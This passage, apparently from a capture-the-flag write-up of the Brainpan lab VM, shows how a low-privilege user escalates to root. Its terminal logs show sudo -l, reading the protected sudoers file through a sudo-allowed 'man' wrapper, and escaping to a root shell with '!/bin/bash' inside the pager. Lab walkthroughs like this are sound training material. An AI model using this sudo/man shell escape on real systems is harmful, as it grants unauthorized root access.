  sasl:x:45:
  plugdev:x:46:reynard
  staff:x:50:
  games:x:60:
  users:x:100:
  nogroup:x:65534:
  libuuid:x:101:
  crontab:x:102:
  syslog:x:103:
  messagebus:x:104:
  fuse:x:105:
  mlocate:x:106:
  ssh:x:107:
  reynard:x:1000:
  lpadmin:x:108:reynard
  sambashare:x:109:reynard
  anansi:x:1001:
  puck:x:1002:
  winbindd_priv:x:110:
puck@brainpan:/etc$
</div>

Looks like there's sudo here :)

<div class="cssterm">
puck@brainpan:/etc$ ls -la sudoers
  ls -la sudoers
  -r--r----- 1 root root 843 Mar&nbsp; 4&nbsp; 2013 sudoers
puck@brainpan:/etc$
</div>

Can my user use it:

<div class="cssterm">
puck@brainpan:/etc$ sudo -l
  sudo -l
  Matching Defaults entries for puck on this host:
  &nbsp;&nbsp;&nbsp; env_reset, mail_badpass,
  &nbsp;&nbsp;&nbsp; secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

  User puck may run the following commands on this host:
  &nbsp;&nbsp;&nbsp; (root) NOPASSWD: /home/anansi/bin/anansi_util
puck@brainpan:/etc$
</div>

Let's have a look:

<div class="cssterm">
puck@brainpan:/etc$ sudo /home/anansi/bin/anansi_util
  sudo /home/anansi/bin/anansi_util
  Usage: /home/anansi/bin/anansi_util [action]
  Where [action] is one of:
  &nbsp; - network
  &nbsp; - proclist
  &nbsp; - manual [command]
puck@brainpan:/home/puck$
</div>

"manual" option uses "man" command. I can read everything now:

<div class="cssterm">
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual /etc/sudoers
  &lt;udo /home/anansi/bin/anansi_util manual /etc/sudoers&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  /usr/bin/man: manual-/etc/sudoers: No such file or directory
  /usr/bin/man: manual_/etc/sudoers: No such file or directory
  No manual entry for manual
  WARNING: terminal is not fully functional
  -&nbsp; (press RETURN)
  #&nbsp; #&nbsp; This file MUST be edited with the \u2019visudo\u2019 command as root.
  # # Please consider adding local content in&nbsp; /etc/sudoers.d/&nbsp; in\u2010
  stead&nbsp; of&nbsp; #&nbsp; directly modifying this file.&nbsp; # # See the man page
  for&nbsp; details&nbsp; on&nbsp; how&nbsp; to&nbsp; write&nbsp;&nbsp; a&nbsp;&nbsp; sudoers&nbsp;&nbsp; file.&nbsp;&nbsp;&nbsp; #&nbsp;&nbsp; De\u2010
  faults&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; env_reset&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Defaults&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mail_badpass&nbsp;&nbsp;&nbsp;&nbsp; De\u2010
  faults&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; secure_path="/usr/local/sbin:/usr/lo\u2010
  cal/bin:/usr/sbin:/usr/bin:/sbin:/bin"

  # Host alias specification

  # User alias specification

  # Cmnd alias specification

  #&nbsp; User&nbsp; privilege&nbsp; specification root&nbsp;&nbsp;&nbsp; ALL=(ALL:ALL) ALL anan\u2010
  si&nbsp; ALL=NOPASSWD:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /home/anansi/bin/anansi_util
  puck&nbsp;&nbsp;&nbsp; ALL=NOPASSWD:&nbsp; /home/anansi/bin/anansi_util&nbsp; # Members of
  the admin group may gain root privileges %admin ALL=(ALL) ALL

  # Allow members of&nbsp; group&nbsp; sudo&nbsp; to&nbsp; execute&nbsp; any&nbsp; command&nbsp; #%su\u2010
  do&nbsp; ALL=(ALL:ALL) ALL

  # See sudoers(5) for more information on "#include" directives:
  &nbsp;Manual page sudoers line 1 (press h for help or q to quit)q
puck@brainpan:/etc$
</div>

I've got some hunch that there's more here than meets the eye. I went through google
looking for some tricks with "man" and guess what I have found
<a href="http://zeronteproject.com/119/" target="top">here</a>:

```
3. Test commands without leaving the man page.</b> Another cool trick is to use <b>!</b>
if you want to try something you just read in the man page. The best part is that you
don't have to close the man page or open another terminal. Type <b>!</b> and next type
the command you want to try. Once finished hit Enter to go back to the man page.
```

Yes, that's mean I can do:

<div class="cssterm">
puck@brainpan:/etc$ sudo /home/anansi/bin/anansi_util manual vi
  sudo /home/anansi/bin/anansi_util manual vi
  No manual entry for manual
  WARNING: terminal is not fully functional
  -&nbsp; (press RETURN)
  VIM(1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VIM(1)

  NAME
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; vim - Vi IMproved, a programmers text editor

  SYNOPSIS
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; vim [options] [file ..]
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; vim [options] -
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; vim [options] -t tag
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; vim [options] -q [errorfile]

  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ex
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; view
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gvim gview evim eview
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rvim rview rgvim rgview

  DESCRIPTION
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Vim&nbsp; is a text editor that is upwards compatible to Vi.&nbsp; It can be used
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; to edit all kinds of plain text.&nbsp; It is especially useful&nbsp; for&nbsp; editing
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; programs.

  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; There&nbsp; are a lot of enhancements above Vi: multi level undo, multi win\u2010
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dows and buffers, syntax highlighting, command line&nbsp; editing,&nbsp; filename
  &nbsp;Manual page vi(1) line 1 (press h for help or q to quit)e
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; completion,&nbsp;&nbsp; on-line&nbsp;&nbsp; help,&nbsp;&nbsp; visual&nbsp; selection,&nbsp; etc..&nbsp;&nbsp; See&nbsp; ":help
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; vi_diff.txt" for a summary of the differences between Vim and Vi.
  &nbsp;Manual page vi(1) line 5 (press h for help or q to quit)!/bin/bash
  !/bin/bash
root@brainpan:/usr/share/man# id
  id
  uid=0(root) gid=0(root) groups=0(root)
root@brainpan:/home/puck# whoami
  whoami
  root
root@brainpan:/home/puck#
</div>

and enjoy my new fresh root :) Just so you know...there's another way to gain root
but that's a topic for another story.
